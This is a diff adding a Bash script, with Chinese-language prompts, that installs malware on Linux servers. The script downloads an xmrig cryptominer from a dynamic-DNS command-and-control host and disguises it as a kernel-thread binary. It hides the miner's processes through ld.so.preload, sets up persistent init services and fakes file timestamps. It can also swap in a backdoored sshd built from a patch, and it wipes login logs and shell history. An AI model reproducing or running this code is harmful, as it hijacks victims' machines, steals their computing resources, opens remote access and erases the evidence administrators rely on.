@@ -1,0 +1,512 @@
+#!/bin/bash
+
+pwd=`pwd`
+
+if [[ `getconf LONG_BIT` == 32 ]]
+then
+	echo -e "[\033[0;32mInfo\033[0m] 32位系统，退出！"
+	rm -f $pwd/1.sh
+	echo > /var/log/wtmp
+	echo > /var/log/btmp
+	echo > /var/log/btmp
+	echo > /var/log/messages
+	echo > ~/.bash_history
+	history -c
+	exit
+fi
+
+if grep -Eqii "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release
+then
+	DISTRO='CentOS'
+	TYPE='yum'
+	pdflushType='launch'
+elif grep -Eqi "Red Hat Enterprise Linux Server" /etc/issue || grep -Eq "Red Hat Enterprise Linux Server" /etc/*-release
+then
+	DISTRO='RHEL'
+	TYPE='yum'
+	pdflushType='launch'
+elif grep -Eqi "Debian" /etc/issue || grep -Eq "Debian" /etc/*-release
+then
+	DISTRO='Debian'
+	TYPE='apt'
+	pdflushType='launch-ubuntu'
+elif grep -Eqi "Ubuntu" /etc/issue || grep -Eq "Ubuntu" /etc/*-release
+then
+	DISTRO='Ubuntu'
+	TYPE='apt'
+	pdflushType='launch-ubuntu'
+elif grep -Eqi "SUSE" /etc/issue || grep -Eq "SUSE" /etc/*-release
+then
+	DISTRO='SUSE'
+	TYPE='zypper'
+	pdflushType='launch'
+else
+	echo "不支持的系统!"
+	exit
+fi
+
+tmepIp=`$busybox ping Rainbow66.f3322.net -c1|$busybox sed '1{s/[^(]*(//;s/).*//;q}'`
+if [[ $tmepIp == "127.0.0.1" ]]
+then
+	remoteIp=47.106.187.104
+elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
+then
+	FIELD1=$(echo $tmepIp|cut -d. -f1)
+	FIELD2=$(echo $tmepIp|cut -d. -f2)
+	FIELD3=$(echo $tmepIp|cut -d. -f3)
+	FIELD4=$(echo $tmepIp|cut -d. -f4)
+	if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
+	then
+		remoteIp=$tmepIp
+	else
+		remoteIp=47.106.187.104
+	fi
+fi
+
+if [[ ! -f /lib64/libg++.so ]]
+then
+	wget http://$remoteIp/xmrig/chattr
+	mv chattr /lib64/libg++.so
+	chmod a+x /lib64/libg++.so
+	/lib64/libg++.so +ai /lib64/libg++.so
+fi
+
+chattr="/lib64/libg++.so"
+busybox="/lib64/busybox"
+#遗留检测
+if [[ -f $busybox ]]
+then
+	echo -e "[\033[0;32mInfo\033[0m] Already install,check for update"
+	launch="/etc/init.d/pdflushs"
+	xmrig="/usr/bin/kthreadds"
+	cron="/lib64/libgc++.so"
+	processhider="/lib64/libstdc++.so"
+	sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"
+	echo -e "[\033[0;32mInfo\033[0m] Starting check for busybox"
+	if [[ `sha512sum $busybox|awk '{print $1}'` != $sha512Busybox ]]
+	then
+		echo -e "[\033[0;31mWarning\033[0m] Busybox is invalid!"
+		exit
+	fi
+	tmepIp=`$busybox ping Rainbow66.f3322.net -c1|$busybox sed '1{s/[^(]*(//;s/).*//;q}'`
+	if [[ $tmepIp == "127.0.0.1" ]]
+	then
+		remoteIp=47.106.187.104
+	elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
+	then
+		FIELD1=$(echo $tmepIp|cut -d. -f1)
+		FIELD2=$(echo $tmepIp|cut -d. -f2)
+		FIELD3=$(echo $tmepIp|cut -d. -f3)
+		FIELD4=$(echo $tmepIp|cut -d. -f4)
+		if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
+		then
+			remoteIp=$tmepIp
+		else
+			remoteIp=47.106.187.104
+		fi
+	fi
+	remoteXmrigSha512=`$busybox wget http://$remoteIp/sha512/xmrig -O - -q`
+	remotePdflushsSha512=`$busybox wget http://$remoteIp/sha512/$pdflushType -O - -q`
+	remoteProcesshiderSha512=`$busybox wget http://$remoteIp/sha512/processhider -O - -q`
+	remoteCronSha512=`$busybox wget http://$remoteIp/sha512/cron -O - -q`
+	localXmrigSha512=`$busybox sha512sum $xmrig|$busybox awk '{print $1}'`
+	localPdflushsSha512=`$busybox sha512sum $launch|$busybox awk '{print $1}'`
+	localProcesshiderSha512=`$busybox sha512sum $processhider|$busybox awk '{print $1}'`
+	localCronSha512=`$busybox sha512sum $cron|$busybox awk '{print $1}'`
+	echo -e "[\033[0;32mInfo\033[0m] Starting check for xmrig"
+	if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]
+	then
+		$busybox chattr -iaR /usr/bin/
+		$busybox rm -f $xmrig
+		$busybox killall kthreadds
+		$busybox wget http://$remoteIp/xmrig/xmrig -O $xmrig
+		timeFile=`$busybox ls -t /usr/bin|$busybox tail -1`
+		$busybox touch -r /usr/bin/$timeFile $xmrig
+		$busybox chmod a+x $xmrig
+		$busybox chattr +ai $xmrig
+	fi
+	echo -e "[\033[0;32mInfo\033[0m] Starting check for lib"
+	if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]
+	then
+		$busybox chattr -iaR /lib64/
+		$busybox rm -f $processhider
+		$busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
+		timeFile=`$busybox ls -t /lib64|$busybox tail -1`
+		$busybox touch -r /lib64/$timeFile $processhider
+		$busybox chattr +ai $processhider
+	fi
+	echo -e "[\033[0;32mInfo\033[0m] Starting check for cron"
+	if [[ $remoteCronSha512 != $localCronSha512 ]]
+	then
+		$busybox kill -9 `$busybox ps|$busybox grep libgc++.so|$busybox grep -v grep|$busybox awk '{print $1}'`
+		$busybox chattr -iaR /lib64/
+		$busybox rm -f $cron
+		$busybox wget http://$remoteIp/xmrig/cron.py -O $cron
+		timeFile=`$busybox ls -t /lib64|$busybox tail -1`
+		$busybox touch -r /lib64/$timeFile $cron
+		$busybox chmod a+x $cron
+		$busybox chattr +ai $cron
+	fi
+	echo -e "[\033[0;32mInfo\033[0m] Starting check for launch"
+	if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]
+	then
+		$busybox kill -9 `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox awk '{print $1}'`
+		$busybox chattr -aiR /etc/init.d/
+		$busybox rm -f $launch
+		if [[ $TYPE == zypper ]]
+		then
+			$busybox wget http://$remoteIp/xmrig/launch -O $launch
+		fi
+		if [[ $TYPE == yum ]]
+		then
+			$busybox wget http://$remoteIp/xmrig/launch -O $launch
+		fi
+		if [[ $TYPE == apt ]]
+		then
+			$busybox wget http://$remoteIp/xmrig/launch-ubuntu -O $launch
+		fi
+		timeFile=`ls -t /etc/init.d|tail -1`
+		$busybox chmod a+x $launch
+		$busybox touch -r /etc/init.d/$timeFile $launch
+		$busybox chattr +ai $launch
+		nohup $launch start > /dev/null &
+	fi
+	if [[ `$busybox ps|$busybox grep pdflush|$busybox grep -v grep|$busybox wc -l` == 0 ]]
+	then
+		nohup $launch start > /dev/null &
+	fi
+	rm -f $pwd/1.sh
+	echo > /var/log/wtmp
+	echo > /var/log/btmp
+	echo > /var/log/btmp
+	echo > /var/log/messages
+	echo > ~/.bash_history
+	history -c
+	echo -e "[\033[0;32mInfo\033[0m] Finsh all"
+	exit
+fi
+
+if ! grep "* soft memlock 262144" /etc/security/limits.conf
+then
+	echo "* soft memlock 262144"  >> /etc/security/limits.conf
+fi
+
+if ! grep "* hard memlock 262144" /etc/security/limits.conf
+then
+	echo "* hard memlock 262144" >> /etc/security/limits.conf
+fi
+
+sysctl -w vm.nr_hugepages=128
+
+if [[ $TYPE == apt ]]
+then
+	apt update
+	apt install net-tools pciutils wget -y
+fi
+if [[ $DISTRO == CentOS ]]
+then
+	yum install net-tools pciutils wget -y
+fi
+
+threads=`cat /proc/cpuinfo| grep "processor"| wc -l`
+GPU_number=`lspci |grep -i vga|wc -l`
+GPU_model=`lspci |grep -i vga|cut -d ":" -f 3`
+speedTemp=`cat /proc/cpuinfo|grep MHz|uniq|head -1|cut -f 2 -d ":"|sed "s/ //g"`
+speed=`echo $speedTemp|cut -c1-1`"."`echo $speedTemp|cut -c2-3`"Ghz"
+cpuModelTemp1=`cat /proc/cpuinfo|grep name|head -1|cut -f 2 -d":"|sed "s/Intel(R) Core(TM)2 Quad  CPU   //g"|sed "s/Pentium(R) Dual-Core  CPU//g"|sed "s/Intel(R) Core(TM)2 Duo CPU     //g"|sed "s/Intel(R) Xeon(R) CPU //g"|sed "s/Intel(R) Celeron(R) CPU //g"|sed "s/ Intel Xeon //g"|sed "s/Intel(R) Xeon(R) //g"|sed "s/ (Sandy Bridge)//g"|sed "s/Intel(R) Core(TM) //g"|sed "s/Intel Core //g"|sed "s/ (Broadwell)//g"`
+cpuModelTemp2=${cpuModelTemp1%%CPU*}
+cpuModel=${cpuModelTemp2%%@*}
+
+installMiner(){
+	wget http://$remoteIp/xmrig/xmrig.tar.gz
+	tar zxvf xmrig.tar.gz
+	cd xmrig
+	timeFile=`ls -t /usr/bin|tail -1`
+	mv xmrig /usr/bin/kthreadds
+	chmod a+x /usr/bin/kthreadds
+	touch -r /usr/bin/$timeFile /usr/bin/kthreadds
+	$chattr +ai /usr/bin/kthreadds
+	sed -i "s/cpuModel/$cpuModel/g" config.json
+	sed -i "s/speed/$speed/g" config.json
+	sed -i "s/cpuThreads/$threads/g" config.json
+	mv config.json /usr/bin/config.json
+	touch -r /usr/bin/$timeFile /usr/bin/config.json
+	timeFile=`ls -t /lib64|tail -1`
+	mv busybox /lib64/busybox
+	chmod a+x /lib64/busybox
+	touch -r /lib64/$timeFile /lib64/busybox
+	$chattr +ai /lib64/busybox
+	mv processhider.so /lib64/libstdc++.so
+	touch -r /lib64/$timeFile /lib64/libstdc++.so
+	$chattr +ai /lib64/libstdc++.so
+	mv cron.py /lib64/libgc++.so
+	chmod a+x /lib64/libgc++.so
+	touch -r /lib64/$timeFile /lib64/libgc++.so
+	$chattr +ai /lib64/libgc++.so
+	$chattr -ai /etc/ld.so.preload
+	timeFile=`ls -t /etc|tail -1`
+	echo /lib64/libstdc++.so > /etc/ld.so.preload
+	touch -r /etc/$timeFile /etc/ld.so.preload
+	$chattr +ai /etc/ld.so.preload
+	if [[ $TYPE == zypper ]]
+	then
+		timeFile=`ls -t /etc/init.d|tail -1`
+		mv launch /etc/init.d/pdflushs
+		chmod a+x /etc/init.d/pdflushs
+		touch -r /etc/init.d/$timeFile /etc/init.d/pdflushs
+		$chattr +ai /etc/init.d/pdflushs
+		chkconfig --add  pdflushs
+		chkconfig pdflushs on
+	fi
+	if [[ $TYPE == yum ]]
+	then
+		timeFile=`ls -t /etc/rc.d/init.d|tail -1`
+		mv launch /etc/rc.d/init.d/pdflushs
+		chmod a+x /etc/rc.d/init.d/pdflushs
+		touch -r /etc/rc.d/init.d/$timeFile /etc/rc.d/init.d/pdflushs
+		$chattr +ai /etc/rc.d/init.d/pdflushs
+		chkconfig --add  pdflushs
+		chkconfig pdflushs on
+	fi
+	if [[ $TYPE == apt ]]
+	then
+		timeFile=`ls -t /etc/init.d|tail -1`
+		mv launch-ubuntu /etc/init.d/pdflushs
+		chmod a+x /etc/init.d/pdflushs
+		touch -r /etc/init.d/$timeFile /etc/init.d/pdflushs
+		$chattr +ai /etc/init.d/pdflushs
+		update-rc.d pdflushs defaults 89
+	fi
+	cd ..
+	rm -rf xmrig*
+	nohup /etc/init.d/pdflushs start > /dev/null &
+	echo -e "[\033[0;32mInfo\033[0m] 已完成！"
+	rm -f $pwd/1.sh
+	echo > /var/log/wtmp
+	echo > /var/log/btmp
+	echo > /var/log/btmp
+	echo > /var/log/messages
+	echo > ~/.bash_history
+	history -c
+	exit
+}
+
+installBackdoor(){
+	sshdPath=`which sshd`
+	sshdTime=`ls -l --full-time $sshdPath|awk '{print $6}'`
+	if [[ $sshdTime == "1954-06-07" ]]
+	then
+		while [ 1 ]
+		do
+		read -p "可能已经安装,是否再安装?[y/n]：" install
+		case $install in
+			y|Y)
+			break
+			;;
+			n|N)
+			exit
+			;;
+			*)
+			echo 未能识别，请重新输入...
+		esac
+		done
+	fi
+	cd /lib64
+	$chattr -ai `which ssh`
+	$chattr -ai `which sshd`
+	$chattr -Rai /lib64/gc++
+	rm -rf /lib64/gc++
+	wget http://$remoteIp/backdoor/openssh.tar.gz
+	tar zxvfm openssh.tar.gz
+	mv openssh gc++
+	$chattr -ai /etc/ssh/ssh_config
+	$chattr -ai /etc/ssh/sshd_config
+	$chattr -ai /etc/ssh/ssh_host_rsa_key
+	rm -f /etc/ssh/ssh_config
+	rm -f /etc/ssh/sshd_config
+	rm -f /etc/ssh/ssh_host_rsa_key
+	if [[ $TYPE == yum ]]
+	then
+		yum install openssl-devel zlib-devel patch gcc make gcc-c++ -y
+		cd gc++
+		patch < sshbd5.5p1.diff
+		cp version.h version.h_bak
+		SSH_VERSION=`strings /usr/sbin/sshd | grep -v "*" | grep "OpenSSH_" | grep -v "-" | grep -v "p1" | grep -v "p2"`
+		if [ `strings /usr/sbin/sshd | grep -v "*" | grep "OpenSSH_" | grep -v "-" | grep "p2" | wc -l` == 0 ]
+		then
+			sed -i "s/ABCDEFGHIJK/$SSH_VERSION/g" version.h && sed -i "s/p2/p1/g" version.h
+			SSH_PORTABLE=p1
+		else
+			sed -i "s/ABCDEFGHIJK/$SSH_VERSION/g" version.h
+			SSH_PORTABLE=p2
+		fi
+		clear
+		ssh -V
+		echo
+		echo SSH_VERSION:$SSH_VERSION
+		echo
+		echo SSH_PORTABLE:$SSH_PORTABLE
+		echo
+		while [ 1 ]
+		do
+			read -p "版本是否正确[y/n]：" sshd_version
+			case $sshd_version in
+			y|Y)
+				./configure --prefix=/usr --sysconfdir=/etc/ssh
+				break
+			;;
+			n|N)
+				\cp version.h_bak version.h
+				read -p "请输入SSH_VERSION：" SSH_VERSION
+				read -p "请输入SSH_PORTABLE：" SSH_PORTABLE
+				sed -i "s/ABCDEFGHIJK/$SSH_VERSION/g" version.h && sed -i "s/p2/$SSH_PORTABLE/g" version.h
+				./configure --prefix=/usr --sysconfdir=/etc/ssh
+				break
+			;;
+			*)
+			echo "未能识别,请重新确认!"
+			esac
+		done
+		make
+		make install
+		if [ -f "/usr/lib/systemd/system/sshd.service" ]
+		then
+			cd /usr/lib/systemd/system/
+			mv sshd.service sshd.service_bak
+			wget http://$remoteIp/backdoor/sshd.txt -O /etc/init.d/sshd
+			chmod a+x /etc/init.d/sshd
+			systemctl daemon-reload
+		fi
+	fi
+
+	if [[ $TYPE == apt ]]
+	then
+		apt-get install patch gcc wget g++ libssl-dev zlib1g zlib1g-dev -y
+		apt-get install libssl1.0-dev -y
+		#apt-get install libssl-dev zlib1g -y
+		#apt-get install zlib1g.dev -y
+		Path_libcrypto=`ldd /usr/sbin/sshd |grep libcrypto|awk '{print $3}'`
+		Openssl_Version=`strings $Path_libcrypto|grep "OpenSSL "|grep -v "of"|grep -vi method|grep -v %|grep -v default|grep -v FAQ|grep -v EC|awk '{print $2}'`
+		#wget http://$remoteIp/backdoor/zlib-1.2.11.tar.gz
+		#wget https://www.openssl.org/source/old/${Openssl_Version:0:5}/openssl-${Openssl_Version}.tar.gz
+		#tar zxvf openssl-${Openssl_Version}.tar.gz
+		#tar zxvf zlib-1.2.11.tar.gz
+		#cd zlib-1.2.11
+		#./configure --prefix=/usr/local/zlib-1.2.11 -share
+		#make
+		#make install
+		#cd ../openssl-${Openssl_Version}
+		#./config shared zlib-dynamic --prefix=/usr/local/openssl-${Openssl_Version} --with-zlib-lib=/usr/local/zlib-1.2.11/lib --with-zlib-include=/usr/local/zlib-1.2.11/include
+		#make
+		#make install
+		#cd ../gc++
+		cd gc++
+		patch < sshbd5.5p1.diff
+		cp version.h version.h_bak
+		SSH_VERSION=`strings /usr/sbin/sshd | grep -v "*" | grep "Ubuntu" | grep "OpenSSH_"`
+		sed -i "s/ABCDEFGHIJK/$SSH_VERSION/g" version.h && sed -i "s/p2/""/g" version.h
+		clear
+		ssh -V
+		echo
+		echo SSH_VERSION:$SSH_VERSION
+		echo
+		while [ 1 ]
+		do
+			read -p "版本是否正确[y/n]：" sshd_version
+			case $sshd_version in
+			y|Y)
+				./configure --prefix=/usr --sysconfdir=/etc/ssh
+				#./configure --prefix=/usr --sysconfdir=/etc/ssh --with-ssl-dir=/usr/local/openssl-${Openssl_Version} --with-zlib=/usr/local/zlib-1.2.11
+				break
+			;;
+			n|N)
+				\cp version.h_bak version.h
+				read -p "请输入SSH_VERSION：" SSH_VERSION
+				sed -i "s/ABCDEFGHIJK/$SSH_VERSION/g" version.h
+				./configure --prefix=/usr --sysconfdir=/etc/ssh
+				#./configure --prefix=/usr --sysconfdir=/etc/ssh --with-ssl-dir=/usr/local/openssl-${Openssl_Version} --with-zlib=/usr/local/zlib-1.2.11
+				break
+			;;
+			*)
+			echo "未能识别,请重新确认!"
+			esac
+		done
+		make
+		make install
+		if [ -f "/lib/systemd/system/ssh.service" ]
+		then
+			cd /lib/systemd/system/
+			mv ssh.service ssh.service_bak
+			wget http://$remoteIp/backdoor/ssh.txt -O /etc/init.d/ssh
+			chmod a+x /etc/init.d/ssh
+			systemctl daemon-reload
+		fi
+	fi
+
+	if [[ $TYPE == zypper ]]
+	then
+		echo 请手动安装!
+		exit
+	fi
+
+	touch -d "1954-06-07" `which ssh`
+	touch -d "1954-06-07" `which sshd`
+	$chattr +ai `which ssh`
+	$chattr +ai `which sshd`
+	$chattr +ai -R /lib64/gc++
+	cd ..
+	rm -rf zlib*
+	rm -rf openssh*
+	service sshd restart
+
+	options
+}
+
+options(){
+	clear
+	echo "———————————————————————————————————————————————————————"
+	echo
+	echo 系统信息:
+	echo
+	echo "* 操作系统: $DISTRO"
+	echo 
+	echo "* CPU信息: "$cpuModel" : "$threads" * "$speed
+	echo 
+	echo "* GPU数量: $GPU_number"
+	echo 
+	echo "* GPU型号:$GPU_model"
+	echo
+	echo "———————————————————————————————————————————————————————"
+	echo
+	echo  选择需要操作的选项:
+	echo
+	echo  1.安装xmrig
+	echo
+	echo  2.安装sshd
+	echo
+	echo "———————————————————————————————————————————————————————"
+	if [[ $threads -ge 9 || $GPU_number -ge 2 ]]
+	then 
+		echo "CPU线程大于 8 或者 GPU数量大于 1"
+		read -p "请输入对应数字：" select
+	else
+		read -t 5 -p "请输入对应数字[默认1]：" select
+		if [[ $select == "" ]]
+		then
+			select=1
+		fi
+	fi
+
+	case $select in
+	1)
+		installMiner
+		;;
+	2)
+		installBackdoor
+		;;
+	*)
+		options
+	esac
+}
+
+options
